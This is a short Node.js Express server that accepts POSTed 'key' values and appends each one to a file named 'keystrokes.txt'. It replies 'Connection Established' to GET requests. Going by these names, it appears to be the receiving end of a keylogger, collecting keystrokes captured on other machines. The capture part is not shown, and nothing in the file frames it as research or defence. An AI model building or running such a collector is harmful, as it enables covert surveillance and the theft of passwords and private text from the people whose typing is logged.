const express = require('express');
const fs = require('fs');  
const app = express();
const port = 3009;
app.use(express.json());

const filePath = 'keystrokes.txt';  


app.post('/', (req, res) => {
    const keyData = req.body.key;
    
   
    fs.appendFile(filePath, `${keyData}\n`, (err) => {
        if (err) {
            console.error('Error writing to file:', err);
            return res.status(500).send('Error writing to file');
        }
        res.status(201).send('Key received and saved');
    });
});


app.get('/', (req, res) => {
    res.status(200).send('Connection Established');
});


app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
